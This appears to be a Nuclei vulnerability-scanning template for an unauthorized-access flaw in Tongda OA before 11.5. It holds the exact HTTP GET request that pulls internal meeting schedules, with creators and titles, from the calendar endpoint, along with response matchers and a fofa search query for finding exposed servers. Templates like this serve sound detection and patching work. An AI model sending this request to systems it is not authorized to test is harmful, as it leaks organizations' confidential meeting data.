http:
    - matchers:
        - status:
            - 200
          type: status
        - part: header
          type: word
          words:
            - application/json
        - condition: and
          part: body
          type: word
          words:
            - creator
            - originalTitle
      matchers-condition: and
      raw:
        - |
          GET /general/calendar/arrange/get_cal_list.php?starttime=1548058874&endtime=33165447106&view=agendaDay HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
          Accept-Encoding: deflate
          Connection: close
      stop-at-first-match: true
id: tongda-meeting-unauthorized-access
info:
    author:
        - 清风明月
    description: |
        通达OA 11.5 之前版本中 /general/calendar/arrange/get_cal_list.php 接口存在未授权访问漏洞。
        攻击者可直接获取企业内部会议安排信息，包括创建人、会议标题等敏感数据。
    metadata:
        fofa-query: app="TDXK-通达OA"
        verified: true
    name: Tongda OA Meeting Information Unauthorized Access
    reference:
        - https://mp.weixin.qq.com/s/3bI7v-hv4rMUnCIT0GLkJA
    severity: medium
    tags:
        - tongda
        - oa
        - unauthorized-access
        - information-disclosure
        - meeting-leak
